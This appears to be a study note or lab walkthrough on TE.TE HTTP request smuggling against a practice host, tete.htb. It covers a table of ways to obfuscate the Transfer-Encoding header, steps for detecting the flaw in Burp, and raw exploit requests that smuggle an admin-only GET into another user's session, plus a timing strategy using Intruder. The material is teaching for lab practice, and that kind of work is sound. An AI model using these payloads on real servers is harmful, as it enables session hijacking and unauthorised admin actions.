# 🎭 TE.TE Request Smuggling

## Overview

TE.TE vulnerabilities occur when:
- **Both** front-end and back-end support `Transfer-Encoding: chunked`
- **But** one system can be tricked into ignoring the TE header through obfuscation
- The tricked system falls back to using `Content-Length`

This effectively creates a **CL.TE** or **TE.CL** scenario depending on which system is tricked.

---

## The Core Concept

Both systems support chunked encoding, but their implementations differ:
- Some check for **exact match**: `Transfer-Encoding: chunked`
- Some check for **substring**: looks for `chunked` anywhere in value
- Some are **strict** about whitespace and formatting
- Some are **lenient** and accept malformed headers

By exploiting these differences, we can make one system ignore the TE header.

---

## TE Header Obfuscation Techniques

| Technique | Header | Description |
|-----------|--------|-------------|
| **Substring match** | `Transfer-Encoding: testchunked` | Value contains "chunked" but isn't exact |
| **Space in header name** | `Transfer-Encoding : chunked` | Space before colon |
| **Horizontal Tab** | `Transfer-Encoding:[\x09]chunked` | Tab (0x09) instead of space |
| **Vertical Tab** | `Transfer-Encoding:[\x0b]chunked` | Vertical tab (0x0b) separator |
| **Leading space** | ` Transfer-Encoding: chunked` | Space before header name |
| **Newline obfuscation** | `Transfer-Encoding: chunked\r\n\r\n` | Extra CRLF |
| **Case variation** | `Transfer-encoding: chunked` | Lowercase 'e' |
| **Duplicate header** | Two `Transfer-Encoding` headers | First vs last wins |

> **Note**: `[\x09]` = horizontal tab (ASCII 0x09), `[\x0b]` = vertical tab (ASCII 0x0b)

---

## Identification

### Step 1: Prepare Test Request

```http
POST / HTTP/1.1
Host: tete.htb
Content-Length: 10
Transfer-Encoding: chunked

0

HELLO
```

### Step 2: Apply Obfuscation

Try each obfuscation technique. Example with **Horizontal Tab**:

1. Open request in Burp Repeater
2. Switch to **Hex view**
3. Find the space (0x20) between `Transfer-Encoding:` and `chunked`
4. Change `0x20` to `0x09` (horizontal tab)

```
Before: Transfer-Encoding: chunked
                         ^
                        0x20 (space)

After:  Transfer-Encoding:	chunked
                         ^
                        0x09 (tab)
```

### Step 3: Send Twice Rapidly

1. Send the obfuscated request
2. Immediately send it again
3. Check second response

### Confirmation

If second response returns **HTTP 405 Method Not Allowed**:
- ✅ Obfuscation worked
- ✅ One system ignored TE header
- ✅ Vulnerable to TE.TE (effectively CL.TE)

```
Response 1: 200 OK (normal)
Response 2: 405 Method Not Allowed (smuggled "HELLO" prefix)
```

---

## Testing All Obfuscation Methods

### Systematic Approach

Try each method until one works:

```http
# Method 1: Substring
Transfer-Encoding: testchunked

# Method 2: Space before colon
Transfer-Encoding : chunked

# Method 3: Horizontal Tab (edit in hex: 0x09)
Transfer-Encoding:	chunked

# Method 4: Vertical Tab (edit in hex: 0x0b)
Transfer-Encoding:chunked

# Method 5: Leading space
 Transfer-Encoding: chunked

# Method 6: Lowercase
transfer-encoding: chunked

# Method 7: Duplicate headers
Transfer-Encoding: chunked
Transfer-Encoding: identity
```

### Burp Suite Hex Editing

1. In Repeater, click **Hex** tab at bottom
2. Find the byte to modify
3. Double-click and enter new hex value
4. Switch back to **Raw** to verify

```
Horizontal Tab: 0x09
Vertical Tab:   0x0b
Space:          0x20
```

---

## Exploitation

### Scenario

Same as CL.TE - force admin to perform action.

### Exploit Request (Horizontal Tab Method)

```http
POST / HTTP/1.1
Host: tete.htb
Content-Length: 46
Transfer-Encoding:	chunked

0

GET /admin?reveal_flag=1 HTTP/1.1
Dummy:
```

> **Note**: The tab character between `:` and `chunked` must be inserted via hex editor.

### Exploit Request (Vertical Tab Method)

```http
POST / HTTP/1.1
Host: tete.htb
Content-Length: 44
Transfer-Encoding:chunked

0

GET /admin?reveal_flag=1 HTTP/1.1
FOO:
```

> **Note**: Vertical tab (0x0b) between `:` and `chunked`.

---

## Time-Sensitive Exploitation

### The Challenge

TE.TE exploits are often **time-sensitive** because:
- Multiple worker threads
- Connection pooling
- Request must hit right after smuggled prefix

### Strategy

1. **Determine admin timing** (e.g., admin visits every 10 seconds)
2. **Send requests periodically** (about once per second)
3. **Continue until success** (smuggled request catches admin's request)

### Practical Steps

```
[Second 0]  Send smuggling request
[Second 1]  Send smuggling request
[Second 2]  Send smuggling request
...
[Second 9]  Send smuggling request
[Second 10] Admin visits → catches smuggled prefix!
```

### Burp Intruder for Timing

1. Send request to Intruder
2. Set **Null payload** type
3. Configure to generate X requests
4. Set **throttle** to 1000ms between requests
5. Start attack

---

## Complete Attack Flow

```
┌─────────────┐                  ┌─────────────┐                  ┌─────────────┐
│   Attacker  │                  │  Front-end  │                  │  Back-end   │
└──────┬──────┘                  └──────┬──────┘                  └──────┬──────┘
       │                                │                                │
       │ POST / HTTP/1.1                │                                │
       │ CL: 46                         │                                │
       │ TE:[\x09]chunked  (obfuscated) │                                │
       │───────────────────────────────>│                                │
       │                                │                                │
       │                                │ Ignores obfuscated TE          │
       │                                │ Uses CL: 46                    │
       │                                │───────────────────────────────>│
       │                                │                                │
       │                                │                                │ Parses TE: chunked
       │                                │                                │ Body ends at "0\r\n\r\n"
       │                                │                                │ Smuggled request left
       │                                │                                │
       │         [10 seconds later - Admin visits]                       │
       │                                │                                │
       │                                │    GET / HTTP/1.1              │
       │                                │    Cookie: admin_session       │
       │                                │<───────────────────────────────│
       │                                │                                │
       │                                │───────────────────────────────>│
       │                                │                                │
       │                                │                                │ Sees smuggled prefix +
       │                                │                                │ admin's headers
       │                                │                                │
       │                                │                                │ GET /admin?reveal_flag=1
       │                                │                                │ with admin's cookie!
```

---

## Differences from CL.TE

| Aspect | CL.TE | TE.TE |
|--------|-------|-------|
| Front-end TE support | ❌ No | ✅ Yes (but tricked) |
| Requires obfuscation | ❌ No | ✅ Yes |
| Complexity | Lower | Higher |
| Detection | Easier | Harder (need to find working obfuscation) |

---

## Tips & Tricks

### Finding the Right Obfuscation

- Start with common methods (tab, space, substring)
- Test each systematically
- Different setups need different obfuscations
- Document what works for the target

### Hex Values Reference

```
0x09 = Horizontal Tab (\t)
0x0a = Line Feed (\n)
0x0b = Vertical Tab
0x0c = Form Feed
0x0d = Carriage Return (\r)
0x20 = Space
```

### Common Server Behaviors

| Server | Typical Behavior |
|--------|------------------|
| Apache | Often strict |
| Nginx | Usually strict |
| Gunicorn | May be lenient |
| HAProxy | Depends on config |
| AWS ALB | Usually strict |

### Persistence is Key

- Multiple attempts often needed
- Timing varies
- Keep trying different obfuscations
- Log successful techniques

---

## Lab Walkthrough Summary

1. **Identify** admin action endpoint (e.g., `/admin?reveal_flag=1`)
2. **Test** for TE.TE using obfuscation + double-send technique
3. **Find working obfuscation** (e.g., vertical tab separator)
4. **Craft exploit** with smuggled admin request
5. **Send periodically** (every ~1 second for 10+ seconds)
6. **Verify** action was performed (check admin page)

---

## References

- [PortSwigger - TE.TE Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HTTP Desync Attacks - James Kettle](https://portswigger.net/research/http-desync-attacks)
- [RFC 7230 - HTTP/1.1 Message Syntax](https://tools.ietf.org/html/rfc7230)

